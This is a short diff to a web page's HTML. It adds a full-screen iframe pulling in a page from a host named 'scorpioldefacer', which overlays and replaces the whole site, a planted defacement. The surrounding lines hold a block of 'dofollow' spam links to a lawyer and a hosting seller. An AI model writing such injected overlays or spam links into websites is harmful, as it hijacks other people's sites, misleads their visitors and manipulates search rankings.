@@ -14,3 +14,6 @@
 <a href="https://www.durankoksal.com.tr/" title="izmir boşanma avukatı" rel="dofollow">izmir boşanma avukatı</a>
 <a href="https://renklihost.com/" title="ucuz vds sunucu" rel="dofollow">ucuz vds sunucu</a>
 </div>
+
+
+<iframe src="https://scorpioldefacer.github.io/index/" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">
